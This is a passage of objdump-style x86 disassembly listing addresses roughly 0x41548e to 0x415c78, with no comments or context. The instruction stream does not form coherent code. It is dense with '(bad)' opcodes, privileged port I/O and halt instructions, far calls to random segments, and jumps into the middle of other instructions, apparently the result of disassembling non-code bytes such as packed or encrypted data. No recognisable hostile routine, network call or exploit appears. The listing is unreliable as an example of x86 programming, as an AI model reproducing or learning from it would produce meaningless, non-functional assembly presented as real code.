  41548e:	mov    al,ds:0xa66cc137
  415493:	clc    
  415494:	mov    eax,0x53a80081
  415499:	call   0x95e80cb6
  41549e:	test   DWORD PTR [ebp+0x49],edi
  4154a1:	imul   esp,DWORD PTR [edi+0x416bc0aa],0xffffffdf
  4154a8:	stos   DWORD PTR es:[edi],eax
  4154a9:	or     BYTE PTR [ecx-0x53],ah
  4154ac:	sahf   
  4154ad:	in     al,0xba
  4154af:	mov    cl,0x18
  4154b1:	xchg   edi,eax
  4154b2:	and    bl,BYTE PTR [ebp+0x23d87cbf]
  4154b8:	add    eax,0x7efd1604
  4154bd:	dec    esi
  4154be:	inc    ebx
  4154bf:	fsubr  QWORD PTR [edx]
  4154c1:	test   al,0x7c
  4154c3:	(bad)  
  4154c5:	or     esp,ebp
  4154c7:	shr    DWORD PTR [eax],1
  4154c9:	or     DWORD PTR [ecx+ebx*2-0x70],esp
  4154cd:	call   0x391a:0x745f6a47
  4154d4:	push   0x9a2bb77e
  4154d9:	imul   BYTE PTR [ecx+0x65859d1c]
  4154df:	mov    ds:0x977ec0cb,eax
  4154e4:	dec    esi
  4154e5:	sbb    eax,0x4469bc0e
  4154ea:	hlt    
  4154eb:	je     0x4154d3
  4154ed:	xchg   esp,eax
  4154ee:	popf   
  4154ef:	ja     0x4154fe
  4154f1:	arpl   WORD PTR [eax-0x61],si
  4154f4:	pop    es
  4154f5:	inc    ecx
  4154f6:	xor    al,0x8e
  4154f8:	aam    0x1b
  4154fa:	sti    
  4154fb:	adc    BYTE PTR [ebx+0x3a5b73d6],0x3b
  415502:	jb     0x415518
  415504:	(bad)  
  415506:	inc    ecx
  415507:	dec    edx
  415508:	xor    BYTE PTR [edi-0x79],0xde
  41550c:	mov    ah,0x3a
  41550e:	or     ebx,ecx
  415510:	xor    eax,0xda24a448
  415515:	sbb    edx,DWORD PTR [edx+0x5b]
  415518:	add    al,0xe4
  41551a:	in     al,0x52
  41551c:	ins    BYTE PTR es:[edi],dx
  41551d:	mov    esp,0xaf0b79c8
  415522:	in     eax,dx
  415523:	cwde   
  415524:	std    
  415525:	pop    es
  415526:	or     eax,eax
  415528:	fidivr WORD PTR [ecx+0x63fa3f05]
  41552e:	jae    0x41559e
  415530:	pop    ds
  415531:	sub    BYTE PTR [edx+0x1a],0x94
  415535:	xor    ch,BYTE PTR [ebp-0x6]
  415538:	mov    esi,0x4c79ce8c
  41553d:	call   0x1308333f
  415542:	mov    al,ds:0x4b7bc3bb
  415547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415548:	outs   dx,DWORD PTR ds:[esi]
  415549:	addr16 push ss
  41554b:	jge    0x4154fa
  41554d:	or     ebx,DWORD PTR [esi+0x3]
  415550:	dec    esi
  415551:	or     DWORD PTR [esi+0x6f18a529],edi
  415557:	xchg   BYTE PTR [eax-0x7d7a5bf1],ah
  41555d:	(bad)  
  41555f:	(bad)  
  415561:	xlat   BYTE PTR ds:[ebx]
  415562:	dec    ebx
  415563:	push   ebp
  415564:	jnp    0x415542
  415566:	adc    DWORD PTR [edi],esi
  415568:	sti    
  415569:	dec    edi
  41556a:	pop    DWORD PTR [esi+0x6e]
  41556d:	nop
  41556e:	xchg   BYTE PTR [ebx+0x218fdc2a],dh
  415574:	mov    ds:0xf7d43710,eax
  415579:	dec    eax
  41557a:	mov    DWORD PTR [esi-0x4046ad48],ebx
  415580:	mov    ds:0xd74471ac,eax
  415585:	jno    0x41550a
  415587:	and    BYTE PTR [eax],0xf4
  41558a:	outs   dx,BYTE PTR ds:[esi]
  41558b:	inc    ecx
  41558c:	fistp  QWORD PTR [edi-0x28]
  41558f:	or     eax,0xcf37dd6
  415594:	out    0xd6,eax
  415596:	ror    dh,1
  415598:	stc    
  415599:	inc    edx
  41559a:	cli    
  41559b:	mov    ah,0x68
  41559d:	jecxz  0x4155c8
  41559f:	jg     0x415575
  4155a1:	int3   
  4155a2:	pop    es
  4155a3:	and    dl,dh
  4155a5:	push   edi
  4155a6:	pushf  
  4155a7:	das    
  4155a8:	or     eax,0x9d94630
  4155ad:	mov    al,0x9
  4155af:	xor    DWORD PTR [esi-0x6f],edi
  4155b2:	inc    ebx
  4155b3:	js     0x415610
  4155b5:	bound  esi,QWORD PTR [esi]
  4155b7:	popf   
  4155b8:	in     eax,0xaa
  4155ba:	jl     0x4155da
  4155bc:	xor    BYTE PTR ds:0xc5183785,bh
  4155c2:	pop    ds
  4155c3:	adc    DWORD PTR [ebx-0x7c0e4395],0xbb2fe466
  4155cd:	xor    BYTE PTR [edi],0xb3
  4155d0:	sti    
  4155d1:	sar    DWORD PTR [edi],0x22
  4155d4:	repnz adc eax,0x4da03cb8
  4155da:	out    0x73,al
  4155dc:	jne    0x4155da
  4155de:	leave  
  4155df:	sub    ecx,DWORD PTR [eax-0x47]
  4155e2:	out    dx,eax
  4155e3:	and    al,0xe6
  4155e5:	sbb    DWORD PTR [esp+eax*2-0x4267e8d9],edi
  4155ec:	sbb    edx,DWORD PTR [ecx]
  4155ee:	(bad)  
  4155ef:	neg    BYTE PTR [eax+0x3c99428d]
  4155f5:	sub    eax,0x2e71119e
  4155fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155fb:	gs iret 
  4155fd:	rol    esp,cl
  4155ff:	or     eax,0xdfce70fa
  415604:	ss hlt 
  415606:	ss ds rcr ebp,1
  41560a:	sar    ah,1
  41560c:	or     BYTE PTR [edi+0x6edb1c36],ch
  415612:	jp     0x4155b4
  415614:	retf   
  415615:	cwde   
  415616:	mov    bl,0xf2
  415618:	nop
  415619:	inc    esp
  41561a:	or     al,0x29
  41561c:	and    bh,BYTE PTR [ebx]
  41561e:	jnp    0x415695
  415620:	push   ss
  415621:	add    ah,BYTE PTR [edi+0x73b7423c]
  415627:	lds    esp,FWORD PTR [ecx+0x54]
  41562a:	or     dh,BYTE PTR [esp+eax*8-0x2fed2860]
  415631:	shl    DWORD PTR [edx-0x57],0xd7
  415635:	push   edi
  415636:	mov    dl,0x94
  415638:	(bad)  
  415639:	sub    bl,BYTE PTR [eax]
  41563b:	popf   
  41563c:	mov    al,ds:0x7403b4ff
  415641:	ins    BYTE PTR es:[edi],dx
  415642:	pop    ecx
  415643:	and    cl,BYTE PTR [edi+0x18b14879]
  415649:	adc    eax,0x85fad00
  41564e:	out    0xbb,eax
  415650:	cli    
  415651:	pop    edx
  415652:	inc    esi
  415653:	imul   edx,esp,0x97ffee9d
  415659:	mov    ch,0x91
  41565b:	push   ebp
  41565c:	daa    
  41565d:	mov    esi,0x36c98b08
  415662:	dec    edi
  415663:	test   eax,0x1fbff413
  415668:	ins    DWORD PTR es:[edi],dx
  415669:	fwait
  41566a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41566b:	jle    0x41566d
  41566d:	outs   dx,DWORD PTR ds:[esi]
  41566e:	js     0x41567f
  415670:	lods   al,BYTE PTR ds:[esi]
  415671:	lods   eax,DWORD PTR gs:[esi]
  415673:	fcomp  DWORD PTR [eax-0x6c33842a]
  415679:	arpl   WORD PTR [ebx+0x32],di
  41567c:	push   eax
  41567d:	dec    edx
  41567e:	pop    ss
  41567f:	push   ss
  415680:	xchg   esp,eax
  415681:	addr16 fs into 
  415684:	jno    0x415656
  415686:	jno    0x415703
  415688:	gs out 0xbd,al
  41568b:	push   edi
  41568c:	ror    BYTE PTR [eax+0x4],cl
  41568f:	pop    ecx
  415690:	paddusw mm5,QWORD PTR [ecx+0x27a76f15]
  415697:	cmp    edx,esp
  415699:	shl    DWORD PTR ds:0x98199c65,cl
  41569f:	pop    eax
  4156a0:	jmp    0x6e708a0f
  4156a5:	dec    ebp
  4156a6:	clc    
  4156a7:	test   DWORD PTR [esi],ebx
  4156a9:	pusha  
  4156aa:	aam    0xaf
  4156ac:	jmp    0x4156f0
  4156ae:	in     al,dx
  4156af:	xchg   edx,eax
  4156b0:	fidivr WORD PTR [ebx+0x7c39f6f3]
  4156b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156b7:	scas   al,BYTE PTR es:[edi]
  4156b8:	in     eax,dx
  4156b9:	pop    eax
  4156ba:	add    al,0x6c
  4156bc:	pop    ebp
  4156bd:	xchg   edi,eax
  4156bf:	scas   al,BYTE PTR es:[edi]
  4156c0:	and    eax,0x140c9736
  4156c5:	fst    QWORD PTR [ebx+0x191f2af1]
  4156cb:	or     ebx,DWORD PTR [ebp+0x679ff3e7]
  4156d1:	aam    0x93
  4156d3:	pop    edi
  4156d4:	pushf  
  4156d5:	rol    BYTE PTR [ecx+0x2d],cl
  4156d8:	rcl    BYTE PTR [eax+0x260330ad],cl
  4156de:	(bad)  
  4156e0:	test   eax,0x8b51dea5
  4156e5:	push   0xffffffdf
  4156e7:	mov    ah,0xb7
  4156e9:	jg     0x4156bd
  4156eb:	outs   dx,BYTE PTR ds:[esi]
  4156ed:	loopne 0x4156dd
  4156ef:	test   BYTE PTR [eax],dl
  4156f1:	sub    BYTE PTR [ebp+0x6d310207],ah
  4156f7:	scas   al,BYTE PTR es:[edi]
  4156f8:	mov    al,0x79
  4156fa:	cmc    
  4156fb:	ins    DWORD PTR es:[edi],dx
  4156fc:	push   ecx
  4156fd:	ins    BYTE PTR es:[edi],dx
  4156fe:	mov    esp,0xf91a2f07
  415703:	mov    dl,0x2c
  415705:	sbb    bl,BYTE PTR [esi+0x332eb01e]
  41570b:	rcl    BYTE PTR [edx-0x2b],1
  41570e:	sar    BYTE PTR ds:0x9b057308,1
  415714:	repnz cmp DWORD PTR [ebx+0x77],0x73
  415719:	popa   
  41571a:	mov    edx,ss
  41571c:	(bad)  
  41571d:	or     edx,DWORD PTR [edi]
  41571f:	aas    
  415720:	mov    bh,ah
  415722:	dec    edx
  415723:	int    0x16
  415725:	cmp    eax,0x96737920
  41572a:	(bad)  
  41572b:	ds jp  0x4156e8
  41572e:	js     0x4156b2
  415730:	outs   dx,DWORD PTR ds:[esi]
  415731:	xchg   edx,eax
  415732:	mov    al,ds:0x6eb3e5a6
  415737:	sub    BYTE PTR [ebx+0x3898a0e7],ah
  41573d:	ss xchg ebx,eax
  41573f:	arpl   WORD PTR [edx],ax
  415741:	ficomp DWORD PTR [eax]
  415743:	mov    edx,0x970e3907
  415748:	pop    ss
  415749:	push   0x17
  41574b:	dec    eax
  41574c:	xor    BYTE PTR [esi],ah
  41574e:	xchg   ebx,eax
  41574f:	and    esi,0xfffffff7
  415752:	sbb    DWORD PTR [edi+0x34c37714],ecx
  415758:	sub    DWORD PTR [eax-0x29],0xc6393c5f
  41575f:	adc    bl,dh
  415761:	ficomp WORD PTR [ebx+0x7b2be91b]
  415767:	lock pushf 
  415769:	in     eax,dx
  41576a:	sub    eax,DWORD PTR [eax+eax*2-0x6c]
  41576e:	xchg   ebx,eax
  41576f:	push   edx
  415770:	aas    
  415771:	xor    DWORD PTR [ecx+0x15874e20],ecx
  415777:	es js  0x4157ee
  41577a:	ud0    edx,DWORD PTR ds:0x63b0c83d
  415781:	aaa    
  415782:	push   edi
  415783:	cmp    bl,BYTE PTR [ecx-0x1d3ee4c]
  415789:	sbb    BYTE PTR [ecx],bh
  41578b:	fld    DWORD PTR [esi]
  41578d:	fs inc esp
  41578f:	cmp    BYTE PTR [ebx-0x36],bl
  415792:	xchg   edx,eax
  415793:	out    dx,al
  415794:	cs xchg DWORD PTR fs:[ecx],ebx
  415798:	dec    esp
  415799:	mov    esp,0x9b94ae9f
  41579e:	jge    0x415734
  4157a0:	adc    eax,0x5337af22
  4157a5:	popf   
  4157a6:	test   al,0xf9
  4157a8:	mov    dh,0x6d
  4157aa:	add    bl,BYTE PTR [esi]
  4157ac:	xchg   ecx,eax
  4157ad:	push   edi
  4157ae:	cmp    ebp,ebx
  4157b0:	add    ch,cl
  4157b2:	test   BYTE PTR [esp+ebp*2-0x4ba2c705],al
  4157b9:	not    BYTE PTR fs:[edx]
  4157bc:	add    esp,edx
  4157be:	xchg   dl,al
  4157c0:	add    ax,WORD PTR [edx+0x37]
  4157c4:	je     0x4157be
  4157c6:	mov    es,esp
  4157c8:	test   eax,ecx
  4157ca:	add    eax,0x71f36922
  4157cf:	xchg   edi,eax
  4157d0:	add    ebp,DWORD PTR ds:0xa3cf3bf1
  4157d6:	lods   al,BYTE PTR ds:[esi]
  4157d7:	imul   esp,DWORD PTR [ebp+0x39],0x7a57e04c
  4157de:	jmp    0xcdaa1677
  4157e3:	push   ecx
  4157e4:	sbb    edx,DWORD PTR [esi]
  4157e6:	rol    DWORD PTR [edx+0x58],0xe3
  4157ea:	pop    ebx
  4157eb:	push   esp
  4157ec:	lds    esi,FWORD PTR [ecx]
  4157ee:	inc    ebp
  4157ef:	std    
  4157f0:	(bad)  
  4157f1:	fld    TBYTE PTR [ebx-0x5b]
  4157f4:	dec    ebx
  4157f5:	inc    BYTE PTR [edi]
  4157f7:	ins    BYTE PTR es:[edi],dx
  4157f8:	fnstcw WORD PTR [ebx]
  4157fa:	jno    0x4157eb
  4157fc:	and    eax,0xcd425c19
  415801:	or     BYTE PTR [ebp+eax*4-0x25],bh
  415805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415806:	clc    
  415807:	daa    
  415808:	test   BYTE PTR [ebx-0x1a187f8e],0x79
  41580f:	sahf   
  415810:	mov    esp,0x97f9618
  415815:	xchg   BYTE PTR [ebx+eax*2],ch
  415818:	jmp    DWORD PTR ds:0xa21f82bd
  41581e:	push   ebp
  41581f:	ss cmp eax,0x161ec142
  415825:	test   eax,0xdc261a19
  41582a:	sbb    DWORD PTR [ebx-0x48a3c0fa],eax
  415830:	rcr    eax,0x9c
  415833:	sbb    eax,0x7e14baf6
  415838:	pushf  
  415839:	call   0xd54bae08
  41583e:	call   0xfc25:0xfb4d6d44
  415845:	sti    
  415846:	mov    eax,ds:0x9322b129
  41584b:	xor    BYTE PTR [esi],0x2d
  41584e:	push   edx
  41584f:	fimul  DWORD PTR [ebp+0xe]
  415852:	cmc    
  415853:	mov    esp,0xdfed2c99
  415858:	cdq    
  415859:	push   ebp
  41585a:	pop    esp
  41585b:	cdq    
  41585c:	jecxz  0x4158b0
  41585e:	or     edi,esp
  415860:	test   eax,0xba71bbfb
  415865:	stos   DWORD PTR es:[edi],eax
  415866:	retf   0x275f
  415869:	jle    0x41581c
  41586b:	test   eax,0xede799ff
  415870:	jge    0x4158ef
  415872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415873:	and    eax,0x80f4762b
  415878:	popa   
  415879:	fimul  DWORD PTR [edx]
  41587b:	jae    0x41585d
  41587d:	push   es
  41587e:	pop    esp
  41587f:	aaa    
  415880:	nop
  415881:	aam    0xfd
  415883:	adc    BYTE PTR [edi-0x6d203aa7],al
  415889:	or     edx,DWORD PTR [edi+ebp*1+0x30]
  41588d:	xor    bh,BYTE PTR [esp+eax*2+0x743106b3]
  415894:	fs inc ebx
  415896:	inc    eax
  415897:	scas   al,BYTE PTR es:[edi]
  415898:	sbb    al,bl
  41589a:	nop
  41589b:	pop    ebp
  41589c:	mov    ebp,0x30f0b1e8
  4158a1:	(bad)  
  4158a3:	call   0xf7e8:0xd94a0dc5
  4158aa:	call   0xf83ded6a
  4158af:	push   ebp
  4158b0:	cmp    al,0x60
  4158b2:	mov    ecx,0x1905ee28
  4158b7:	xor    al,bh
  4158b9:	icebp  
  4158ba:	cs test al,0xba
  4158bd:	aaa    
  4158be:	xchg   esp,eax
  4158bf:	or     DWORD PTR [eax],eax
  4158c1:	and    BYTE PTR [edi+0x575b8acb],0x3f
  4158c8:	js     0x4158ab
  4158ca:	or     dh,BYTE PTR [eax-0x67]
  4158cd:	cld    
  4158ce:	cwde   
  4158cf:	mov    ebx,0x3eb6dbb7
  4158d4:	add    dl,BYTE PTR [edx-0x4d]
  4158d7:	cwde   
  4158d8:	push   edx
  4158d9:	dec    edi
  4158da:	aad    0x0
  4158dc:	pop    edi
  4158dd:	das    
  4158de:	das    
  4158df:	ss retf 0x6487
  4158e3:	xchg   edi,eax
  4158e4:	outs   dx,BYTE PTR ds:[esi]
  4158e5:	stos   BYTE PTR es:[edi],al
  4158e6:	bound  eax,QWORD PTR [edx-0x475ead21]
  4158ec:	mov    ebp,0x43b15e3b
  4158f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158f2:	ins    BYTE PTR es:[edi],dx
  4158f3:	aas    
  4158f4:	adc    ebx,ebx
  4158f6:	sbb    DWORD PTR [esi-0x4f],ebp
  4158f9:	xlat   BYTE PTR ds:[ebx]
  4158fa:	stc    
  4158fb:	ror    DWORD PTR [esi],1
  4158fd:	mov    edi,0xfb0a3667
  415902:	mov    ch,0x9f
  415904:	in     eax,0x4b
  415906:	inc    edi
  415907:	jbe    0x415942
  415909:	adc    eax,0xc7f04d33
  41590e:	xor    BYTE PTR [eax*1-0x5a7bd39f],ch
  415915:	push   cs
  415916:	(bad)  
  415918:	pushf  
  415919:	repnz loope 0x4158a3
  41591c:	stos   DWORD PTR es:[edi],eax
  41591d:	das    
  41591e:	into   
  41591f:	je     0x415957
  415921:	inc    ecx
  415922:	adc    al,0x1e
  415924:	inc    edx
  415925:	lock ins BYTE PTR es:[edi],dx
  415927:	in     al,dx
  415928:	inc    esi
  415929:	push   eax
  41592a:	or     DWORD PTR [eax],0x8bae7bed
  415930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415931:	(bad)  
  415932:	repz add BYTE PTR [eax-0x5c],0x78
  415937:	cmp    al,0x55
  415939:	sti    
  41593a:	out    dx,al
  41593b:	mov    DWORD PTR [ebx+0x4a1caf38],esi
  415941:	inc    edx
  415942:	jb     0x41591d
  415944:	into   
  415945:	iret   
  415946:	ror    DWORD PTR [ebx],cl
  415948:	mov    bl,0x3b
  41594a:	ret    
  41594b:	sar    eax,cl
  41594d:	fcomp  QWORD PTR [ecx+edx*2+0x60bb09fe]
  415954:	dec    esp
  415955:	stc    
  415956:	loop   0x415923
  415958:	in     eax,0xc1
  41595a:	fadd   QWORD PTR [ecx+0x749c0edc]
  415960:	pop    eax
  415961:	mov    cl,0xfc
  415963:	xchg   DWORD PTR [esi+0x18572ade],eax
  415969:	ja     0x415951
  41596b:	(bad)  
  41596d:	inc    eax
  41596e:	sbb    eax,0x2e8d1f3e
  415973:	cmp    eax,0xed98a8a
  415978:	inc    ebp
  415979:	inc    esi
  41597a:	ja     0x4159ac
  41597c:	mov    ds:0x9bed89fb,al
  415981:	hlt    
  415982:	dec    eax
  415983:	or     eax,0xc667d27
  415988:	pusha  
  415989:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41598b:	pop    ebp
  41598c:	addr16 mov ch,0x66
  41598f:	adc    dl,BYTE PTR [eax-0x2b]
  415992:	test   al,0xc8
  415994:	jne    0x415999
  415996:	in     eax,dx
  415997:	adc    BYTE PTR [edx+0x481b08a8],0x15
  41599e:	test   eax,0xb01fbaff
  4159a3:	ret    
  4159a4:	ss and eax,0x98ce6155
  4159aa:	ficomp DWORD PTR ds:0xd47004eb
  4159b0:	(bad)  
  4159b1:	adc    DWORD PTR [ebx],ecx
  4159b3:	adc    DWORD PTR [esi-0x3c],0xfffffff9
  4159b7:	jns    0x41595d
  4159b9:	mov    ch,0x46
  4159bb:	outs   dx,DWORD PTR ds:[esi]
  4159bc:	(bad)  
  4159bd:	shr    BYTE PTR [esi],cl
  4159bf:	psllw  mm5,QWORD PTR [ebx]
  4159c2:	fld    QWORD PTR [edi+0x1570cddc]
  4159c8:	sbb    eax,0x44549759
  4159cd:	push   es
  4159ce:	mov    ah,bh
  4159d0:	push   ss
  4159d1:	jp     0x415955
  4159d3:	test   eax,0xacd6eb41
  4159d8:	and    ecx,DWORD PTR [ecx-0xb]
  4159db:	(bad)  
  4159dd:	fldl2e 
  4159df:	popa   
  4159e0:	adc    DWORD PTR [esi+0x7b],esp
  4159e3:	add    DWORD PTR [ecx+0x4ab35132],esp
  4159e9:	in     eax,dx
  4159ea:	stc    
  4159eb:	or     al,0x1f
  4159ed:	out    dx,al
  4159ee:	pop    edx
  4159ef:	dec    edx
  4159f0:	into   
  4159f1:	test   al,0x61
  4159f3:	call   FWORD PTR [edi+0x44]
  4159f6:	jge    0x4159db
  4159f8:	inc    ebp
  4159f9:	cs pop esp
  4159fb:	and    eax,0x8c13f9fb
  415a00:	mov    ds:0x7ac4bd1a,eax
  415a05:	popa   
  415a06:	adc    DWORD PTR [edi-0x5299e79f],ebx
  415a0c:	ror    DWORD PTR [edi+eiz*2+0x696a915d],0xdc
  415a14:	ret    0x4d93
  415a17:	inc    esp
  415a18:	mov    edi,0x2327efd9
  415a1d:	add    eax,0x42a4fc8e
  415a22:	pop    es
  415a23:	sub    eax,0x36d7320e
  415a28:	mov    edi,db5
  415a2b:	hlt    
  415a2c:	sbb    BYTE PTR [edx+0x59],0x84
  415a30:	dec    eax
  415a31:	shr    ah,cl
  415a33:	es (bad) 
  415a36:	add    DWORD PTR [edi],0x31170c8c
  415a3c:	push   esi
  415a3d:	in     eax,dx
  415a3e:	sub    ah,BYTE PTR [edx]
  415a40:	add    esp,DWORD PTR [ebp-0x5a4038d8]
  415a46:	ja     0x415a5f
  415a48:	outs   dx,DWORD PTR ds:[esi]
  415a49:	jecxz  0x415a06
  415a4b:	cld    
  415a4c:	clc    
  415a4d:	and    ebp,DWORD PTR [ebp+0x23c3c474]
  415a53:	and    eax,0x9f8c293e
  415a58:	add    esi,edi
  415a5a:	xchg   ebp,eax
  415a5b:	clc    
  415a5c:	mov    ebp,eax
  415a5e:	push   ebp
  415a5f:	stc    
  415a60:	xchg   ecx,eax
  415a61:	(bad)  
  415a62:	fwait
  415a63:	nop
  415a64:	test   bh,bh
  415a66:	adc    BYTE PTR [edi-0x19],ch
  415a69:	pop    ds
  415a6a:	adc    eax,esp
  415a6c:	std    
  415a6d:	outs   dx,BYTE PTR ds:[esi]
  415a6e:	xor    ebx,ecx
  415a70:	mov    dh,0x11
  415a72:	test   al,0x42
  415a74:	neg    BYTE PTR [edi-0x7003c4c3]
  415a7a:	inc    ebp
  415a7b:	outs   dx,DWORD PTR ds:[esi]
  415a7c:	es dec esp
  415a7e:	sbb    ah,BYTE PTR [ebx]
  415a80:	in     al,dx
  415a81:	xchg   esi,eax
  415a82:	gs mov ebp,0x3cb08d95
  415a88:	sub    ebx,DWORD PTR [ebp+edi*1+0x17]
  415a8c:	xchg   ecx,eax
  415a8d:	fcom   DWORD PTR [ebx+0x64]
  415a90:	rol    BYTE PTR [edx],1
  415a92:	xor    ch,dl
  415a94:	inc    ebp
  415a95:	stc    
  415a96:	dec    ebx
  415a97:	mov    ah,0x2a
  415a99:	xchg   ebx,eax
  415a9a:	rol    BYTE PTR [ecx],1
  415a9c:	mov    esp,0x4e2f2593
  415aa1:	adc    bh,BYTE PTR [edi-0x78253428]
  415aa7:	je     0x415a86
  415aa9:	sbb    esi,DWORD PTR [ecx+edx*4]
  415aac:	and    al,0x39
  415aae:	push   ebp
  415aaf:	pop    ds
  415ab0:	sar    DWORD PTR [edx+0x7e860c14],0x7c
  415ab7:	iret   
  415ab8:	mov    ah,0xa4
  415aba:	sub    edi,DWORD PTR [esi-0x35]
  415abd:	xor    BYTE PTR ds:[edx+0x581a1fdc],0xc1
  415ac5:	mov    bl,ch
  415ac7:	add    edx,DWORD PTR [edi]
  415ac9:	mov    al,0xac
  415acb:	or     al,0xf0
  415acd:	ds cdq 
  415acf:	push   esi
  415ad0:	sbb    eax,DWORD PTR [eax+0x30]
  415ad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ad4:	cmp    ch,BYTE PTR [ecx-0x6c0213f5]
  415ada:	mov    ch,0x2b
  415adc:	mov    ds:0xc5523439,al
  415ae1:	jno    0x415ac4
  415ae3:	cmp    eax,0x78a7db72
  415ae8:	ss inc eax
  415aea:	cwde   
  415aeb:	mov    ah,0x25
  415aed:	and    esi,edi
  415aef:	ja     0x415acb
  415af1:	adc    eax,0x7db9239e
  415af6:	sti    
  415af7:	mov    ebp,0xa0c64744
  415afc:	and    bh,BYTE PTR [esi-0x4de5c987]
  415b02:	ficomp WORD PTR [ecx]
  415b04:	pop    ss
  415b05:	sar    DWORD PTR [edi+0x36],cl
  415b08:	or     DWORD PTR [ecx],0x5b
  415b0b:	clc    
  415b0c:	int3   
  415b0d:	xor    esi,0x7de06568
  415b13:	pop    esp
  415b14:	inc    eax
  415b15:	shl    DWORD PTR [esi],cl
  415b17:	(bad)
  415b1a:	pop    ebp
  415b1b:	xchg   esp,eax
  415b1c:	pop    edi
  415b1d:	sahf   
  415b1e:	pop    ds
  415b1f:	fstp   TBYTE PTR [edx+0x3d35d154]
  415b25:	cld    
  415b26:	sub    eax,0xc7b4d7e7
  415b2b:	add    ecx,ecx
  415b2d:	lock test DWORD PTR [edi],0x7b23da3b
  415b34:	pop    edi
  415b35:	jae    0x415aba
  415b37:	ins    BYTE PTR es:[edi],dx
  415b38:	dec    edx
  415b39:	sti    
  415b3a:	fisub  WORD PTR [ebx]
  415b3c:	sbb    BYTE PTR [ebx+0xf],dl
  415b3f:	sbb    eax,0x72fca0d5
  415b44:	cmp    DWORD PTR [ecx+esi*8-0x17],edi
  415b48:	xchg   ebx,eax
  415b49:	push   0xfe159800
  415b4e:	clc    
  415b4f:	add    dl,0xde
  415b52:	neg    BYTE PTR [edi-0x475f46aa]
  415b58:	mov    bh,0x1d
  415b5a:	push   ebp
  415b5b:	inc    ebx
  415b5c:	shr    DWORD PTR [ebx-0x708975a5],0x9c
  415b63:	adc    BYTE PTR [bx+di-0x4de9],0x80
  415b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b6a:	jbe    0x415b46
  415b6c:	ror    BYTE PTR [ebx],0xb9
  415b6f:	mov    al,cl
  415b71:	push   cs
  415b72:	cld    
  415b73:	ror    DWORD PTR [edi],1
  415b75:	cwde   
  415b76:	xchg   esp,eax
  415b77:	inc    esp
  415b78:	push   edi
  415b79:	dec    esp
  415b7a:	sub    cl,al
  415b7c:	adc    DWORD PTR [edx+0x61],edx
  415b7f:	push   cs
  415b80:	pop    ebx
  415b81:	mov    dh,0x33
  415b83:	xor    al,0xa8
  415b85:	dec    esp
  415b86:	dec    edx
  415b87:	and    al,0xc8
  415b89:	pop    ebp
  415b8a:	imul   ebp,DWORD PTR [ecx+0x37],0xffffffe6
  415b8e:	int    0x4
  415b90:	das    
  415b91:	shr    eax,0xb7
  415b94:	push   cs
  415b95:	add    DWORD PTR [ebx+0x4e8534e7],esi
  415b9b:	jbe    0x415bcf
  415b9d:	inc    esi
  415b9e:	sub    DWORD PTR [ecx+esi*2+0x66568163],ebp
  415ba5:	cdq    
  415ba6:	jae    0x415bea
  415ba8:	out    0xe6,eax
  415baa:	(bad)  
  415bab:	push   edx
  415bac:	int    0x6a
  415bae:	lods   al,BYTE PTR ds:[esi]
  415baf:	push   0x6081a11e
  415bb4:	cmc    
  415bb5:	test   eax,0x3e8d17f2
  415bba:	dec    edx
  415bbb:	xlat   BYTE PTR ds:[ebx]
  415bbc:	inc    edx
  415bbd:	cmc    
  415bbe:	dec    ecx
  415bbf:	inc    eax
  415bc0:	hlt    
  415bc1:	sbb    ebx,DWORD PTR [edi]
  415bc3:	pop    es
  415bc4:	test   eax,0x5a73fd53
  415bc9:	xchg   ebp,eax
  415bca:	js     0x415b98
  415bcc:	stos   DWORD PTR es:[edi],eax
  415bcd:	inc    edi
  415bce:	je     0x415bf7
  415bd0:	xchg   DWORD PTR [eax+0x30],ebx
  415bd3:	jo     0x415c26
  415bd5:	push   eax
  415bd6:	or     edi,DWORD PTR [ebx-0xe05c0cd]
  415bdc:	mov    edi,0xfcc87b14
  415be1:	mov    eax,0xa9c99c24
  415be6:	mov    dl,0xe5
  415be8:	sbb    di,di
  415beb:	or     BYTE PTR [ecx],dh
  415bed:	lds    edi,FWORD PTR [ebp+edi*2-0x1facd0d8]
  415bf4:	mov    bh,0xf4
  415bf6:	add    bl,BYTE PTR [ebp-0x2f]
  415bf9:	enter  0x1297,0x99
  415bfd:	jno    0x415c27
  415bff:	add    BYTE PTR [edx*4-0x744d22f],dl
  415c06:	and    BYTE PTR [eax],al
  415c08:	xor    edi,ebp
  415c0a:	stc    
  415c0b:	fisubr DWORD PTR [eax+ebx*1-0x8]
  415c0f:	loopne 0x415bef
  415c11:	mov    ds:0x7b5eabb5,al
  415c16:	pop    edi
  415c17:	add    eax,0xe923011d
  415c1c:	xor    al,0xc7
  415c1e:	xor    eax,0x6a67ee71
  415c23:	stos   BYTE PTR es:[edi],al
  415c24:	sub    DWORD PTR [ebp-0x2],edi
  415c27:	add    BYTE PTR [edi-0x27],0xf
  415c2b:	mov    esi,0x74b2a20c
  415c30:	int    0x53
  415c32:	add    eax,0x5c70b35
  415c37:	mov    ecx,0x80aa63da
  415c3c:	xchg   ecx,eax
  415c3d:	pop    ebp
  415c3e:	(bad)  
  415c3f:	out    dx,al
  415c40:	icebp  
  415c41:	xor    esi,DWORD PTR [edi-0x61]
  415c44:	sbb    ch,BYTE PTR [esi]
  415c46:	fcom   st(2)
  415c48:	imul   DWORD PTR [eax]
  415c4a:	sub    DWORD PTR [ecx+0x4828fa19],edx
  415c50:	js     0x415cc0
  415c52:	rcl    ebx,0x4b
  415c55:	rcr    eax,0x2d
  415c58:	or     DWORD PTR [ebx],0x80adf865
  415c5e:	dec    esi
  415c5f:	lea    ecx,[esi]
  415c61:	xchg   edx,eax
  415c62:	mov    edx,0xb820c918
  415c67:	shl    ah,0x1e
  415c6a:	addr16 xor al,0x49
  415c6d:	and    eax,0xe7b01b34
  415c72:	test   eax,0x72d8cda7
  415c77:	scas   eax,DWORD PTR es:[edi]
  415c78:	inc    edx
